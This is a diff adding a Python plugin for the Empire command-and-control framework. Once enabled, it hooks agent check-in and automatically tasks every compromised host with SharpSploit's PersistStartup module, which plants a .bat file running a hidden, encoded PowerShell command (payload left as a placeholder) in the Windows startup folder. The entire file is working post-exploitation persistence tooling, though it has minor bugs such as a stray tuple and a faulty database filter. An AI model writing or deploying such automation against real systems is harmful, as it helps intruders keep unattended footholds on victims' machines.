@@ -1,0 +1,183 @@
+from __future__ import print_function
+
+import empire.server.common.helpers as helpers
+
+from empire.server.common.hooks import hooks
+from empire.server.common.plugins import Plugin
+from empire.server.common.module_models import PydanticModule
+from empire.server.database import models
+from empire.server.database.base import Session
+
+# this class MUST be named Plugin
+class Plugin(Plugin):
+    description = "Automatically run PersistStartup module on checkin."
+
+    def onLoad(self):
+        print(helpers.color("[*] Loading autopersiststartup plugin"))
+        self.main_menu = None
+        self.info = {
+            "Name": "autopersiststartup",
+            "Author": ["@yok4i"],
+            "Description": ("Execute PersistStartup module as soon as agent check in."),
+            "Software": "",
+            "Techniques": ["T1547"],
+            "Comments": ["Put a .bat file in startup folder."]
+        },
+
+        self.options = {
+            "DotNetVersion": {
+                "Description": ".NET version to compile against",
+                "Required": True,
+                "Value": "Net35",
+                "SuggestedValues": [
+                    "Net35",
+                    "Net40"
+                ],
+                "Strict": True
+            },
+            "FileName": {
+                "Description": "Name of the file to write",
+                "Required": True,
+                "Value": "startup.bat"
+            },
+            "Payload": {
+                "Description": "Payload to write to file",
+                "Required": True,
+                "Value": "powershell -sta -nop -w 1 -enc <blah>"
+            },
+            "Status": {
+                "Description": "<start/stop/status>",
+                "Required": True,
+                "Value": "start",
+                "SuggestedValues": ["start", "stop", "status"],
+                "Strict": True,
+            },
+        }
+        self.hook_name = "autopersiststartupplugin"
+        self.hook_event = hooks.AFTER_AGENT_STAGE2_HOOK
+        self.enabled = False
+
+    def execute(self, command):
+        try:
+            self.status = self.options["Status"]["Value"]
+            results = self.do_autostartuppersistence("")
+            return results
+        except Exception as e:
+            print(e)
+            self.main_menu.plugin_socketio_message(self.info[0]["Name"], f"[!] {e}")
+            return False
+
+    def get_commands(self):
+        return self.commands
+
+    def register(self, mainMenu):
+        """
+        Any modifications to the mainMenu go here - e.g.
+        registering functions to be run by user commands
+        """
+        mainMenu.__class__.do_autostartuppersistence = self.do_autostartuppersistence
+        self.installPath = mainMenu.installPath
+        self.main_menu = mainMenu
+
+    def do_autostartuppersistence(self, *args):
+        """
+        Control Auto-StartupPersistence plugin
+        """
+        if self._hook_exist(self.hook_event, self.hook_name):
+             self.enabled = True
+        else:
+             self.enabled = False
+        
+        if self.status == "status":
+            if self.enabled:
+                self.main_menu.plugin_socketio_message(
+                    self.info[0]["Name"], "[+] autopersiststartup plugin is currently enabled"
+                )
+            else:
+                self.main_menu.plugin_socketio_message(
+                    self.info[0]["Name"], "[!] autopersiststartup plugin is currently disabled"
+                )
+
+        elif self.status == "stop":
+            if self.enabled:
+                hooks.unregister_hook(self.hook_name, self.hook_event)
+                if not self._hook_exist(self.hook_event, self.hook_name):
+                    self.main_menu.plugin_socketio_message(
+                        self.info[0]["Name"], f"[*] autopersiststartup plugin turned off"
+                    )
+                else:
+                    self.main_menu.plugin_socketio_message(
+                        self.info[0]["Name"], f"[!] could not unregister hook"
+                    )
+            else:
+                self.main_menu.plugin_socketio_message(
+                    self.info[0]["Name"], "[!] autopersiststartup plugin is already turned off"
+                )
+
+        elif self.status == "start":
+            if self.enabled:
+                self.main_menu.plugin_socketio_message(
+                    self.info[0]["Name"], "[!] autopersiststartup plugin is already turned on"
+                )
+            else:
+                # register hook
+                hooks.register_hook(self.hook_event, self.hook_name, self.task_persistence)
+                if self._hook_exist(self.hook_event, self.hook_name):
+                    self.main_menu.plugin_socketio_message(
+                        self.info[0]["Name"], f"[+] autopersiststartup plugin turned on"
+                    )
+                else:
+                    self.main_menu.plugin_socketio_message(
+                        self.info[0]["Name"], f"[!] could not register hook"
+                    )
+    
+    def task_persistence(self, agent: models.Agent):
+        """
+        Create a new task to run PersistStartup module for the given agent
+        """
+        module_name = "csharp/SharpSploit.Persistence/PersistStartup"
+        module: PydanticModule = self.main_menu.modules.get_module(module_name)
+        if not module:
+            self.main_menu.plugin_socketio_message(
+                self.info[0]["Name"], f"[!] module name {module_name} not found"
+            )
+            print(helpers.color(f"[!] module name {module_name} not found"))
+            return
+        # define module options
+        options = {
+            "Agent": agent.name,
+            "DotNetVersion": self.options["DotNetVersion"]["Value"],
+            "FileName": self.options["FileName"]["Value"],
+            "Payload": self.options["Payload"]["Value"]
+        }
+        # get id from admin
+        admin = (
+            Session()
+            .query(models.User)
+            .filter(models.User.admin == True and models.User.enabled == True)
+            .first()
+        )
+        if admin:
+            admin_id = admin.id
+        else:
+            admin_id = 1
+        result, err = self.main_menu.modules.execute_module(
+            module, params=options, user_id=admin_id)
+        if err:
+            self.main_menu.plugin_socketio_message(
+                self.info[0]["Name"], f"[!] {err}"
+            )
+        else:
+            self.main_menu.plugin_socketio_message(
+                self.info[0]["Name"], f"[+] Task {result['taskID']}: {result['msg']}"
+            )
+
+    def _hook_exist(self, event: str, name: str):
+        return name in hooks.hooks.get(event, {}).keys()
+
+    def shutdown(self):
+        """
+        Kills additional processes that were spawned
+        """
+        pass
+
